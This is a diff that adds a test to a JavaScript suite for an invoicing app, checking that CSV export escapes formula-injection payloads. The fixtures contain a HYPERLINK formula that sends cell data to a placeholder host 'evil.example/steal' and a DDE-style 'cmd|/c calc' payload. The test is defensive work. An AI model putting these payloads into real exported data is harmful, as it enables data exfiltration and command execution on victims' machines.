@@ -84,6 +84,29 @@ test("export csv", async () => {
   expect(res.text).toContain("Acme Supplies Inc");
 });
 
+test("export csv neutralizes formula-injection payloads instead of exporting live formulas", async () => {
+  const token = await signup(app, request);
+  const org = await orgId(token);
+  await makeInvoice(org, {
+    vendorName: '=HYPERLINK("http://evil.example/steal?x="&A1,"Click")',
+    originalFilename: "@SUM(1+1)*cmd|'/c calc'!A1",
+  });
+
+  const res = await request(app).get("/api/export/csv").set(authHeader(token));
+  expect(res.status).toBe(200);
+  // vendor_name contains a comma/quote, so csv-quoting wraps the field in
+  // "..." -- the sanitizer's apostrophe must appear right after that
+  // opening quote, not just anywhere before "HYPERLINK" (a naive regex
+  // checking "no quote/apostrophe immediately before" would pass even
+  // unsanitized here, since CSV's own quoting also inserts a `"` there).
+  expect(res.text).toContain('"\'=HYPERLINK(');
+  expect(res.text).not.toContain('"=HYPERLINK(');
+  // original_filename has no special CSV characters, so it's written
+  // unquoted -- the apostrophe must sit directly after the preceding comma.
+  expect(res.text).toContain(",'@SUM(1+1)");
+  expect(res.text).not.toContain(",@SUM(1+1)");
+});
+
 test("invoice correction writes audit log", async () => {
   const token = await signup(app, request);
   const org = await orgId(token);
